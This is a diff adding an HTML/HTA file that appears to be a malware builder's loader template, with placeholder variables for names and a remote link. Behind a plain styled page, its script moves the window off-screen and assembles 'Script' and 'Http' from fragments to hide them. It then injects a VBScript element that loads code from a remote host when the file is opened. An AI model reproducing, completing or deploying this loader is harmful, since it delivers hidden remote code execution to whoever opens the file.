@@ -1,0 +1,51 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+
+   <style>
+        h1 {
+            color: #0056b2;
+        }
+        body {
+		line-height: 1.4;
+            font-family: Arial, sans-serif;
+            
+            margin: 31px;
+		color: #331;
+            background-color: #f4f4f8;
+            
+        }
+
+        a {
+            color: #006bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+ </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.1">
+    <title>%hta_var_01%</title>
+</head>
+<body>
+<script>
+	moveTo(7796, 4952);
+	%hta_var_02%  = 'iPt';
+	%hta_var_01% = 'cR';
+	%hta_var_01% = 'S' + %hta_var_01% + %hta_var_02% ;
+
+    %hta_boj_01%  = document.createElement(%hta_var_01%);
+    %hta_boj_01%.type = 'text/vbscript';
+    %hta_boj_01%.async = true;
+    
+    %hta_var_01% ='H';
+    %hta_var_02% ='p';
+
+    %hta_boj_01%.src = %hta_var_01% + 'tt' + %hta_var_02% +':/' + '%htal_link%';
+    document.body.appendChild(%hta_boj_01%);
+</script>
+</body>
+%textrand%
+</body>
+</html>
